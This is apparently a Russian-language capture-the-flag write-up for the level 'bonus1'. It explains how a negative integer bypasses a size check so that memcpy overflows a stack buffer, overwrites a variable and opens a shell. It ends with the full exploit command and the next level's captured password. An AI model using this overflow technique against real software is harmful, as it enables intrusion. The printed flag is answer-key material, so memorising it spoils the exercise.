## bonus1
Чтобы перейти к части программы, запускающей программную оболочку, необходимо передать ей такой аргумент, который бы прошел две проверки:

```c
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv) {
	int		val; // хранится по адресу $esp+0x3c
	char	buffer[40]; // начинается по адресу $esp+0x14

	val = atoi(argv[1]);
	// ПРОВЕРКА 1
	if (val > 9) {
		return 1;
	}

	memcpy(buffer, argv[2], val << 2);
	// ПРОВЕРКА 2
	if (val == 0x574f4c46) {
		execl("/bin/sh", "sh", NULL);
	}
	return 0;
}
```

Чтобы пройти первую проверку,  значение `val `  не должно превышать 9, в то время как для второй проверки `val` должно равняться `0x574f4c46`. Значит, нам нужно воспользоваться вызовом `memcpy`, расположенным между проверками, для того чтобы переполнить буфер и заменить значение `val ` на `0x574f4c46`.

Между началом буфера и переменной `val`  лежит  `0x3c-0x14=40` байтов. Чтобы `memcpy` записал достаточное количество байтов, `val` должен одновременно удовлетворять двум условиям:

* `val <= 9`
* `val << 2 = 44`

Это осуществимо, ведь, согласно [дополнительному коду](https://ru.wikipedia.org/wiki/Дополнительный_код), можно просто включить наибольший бит в 32-битном представлении числа `44 >> 2 = 11`. Получается `10000000000000000000000000001011`, что равно `-2147483637`.

Наша атака, таким образом, имеет следующий вид:

```sh
$ echo "cd ..; cat bonus2/.pass" | ./bonus1 -2147483637 $(python -c 'print "a"*40 + "\x46\x4c\x4f\x57"')
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
